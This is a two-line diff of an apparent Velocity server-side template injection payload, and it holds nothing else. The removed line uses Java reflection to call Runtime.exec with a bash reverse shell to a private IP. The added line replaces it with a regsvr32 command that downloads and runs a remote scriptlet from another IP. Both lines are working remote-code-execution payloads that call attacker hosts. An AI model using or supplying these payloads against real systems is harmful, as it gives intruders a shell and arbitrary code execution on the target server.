@@ -1,2 +1,3 @@
 #set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("bash -i >& /dev/tcp/172.31.12.125/80 0>&1")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("regsvr32 /s /n /u /i:http://172.27.233.75:8080/tFXQ5s.sct scrobj.dll
+")
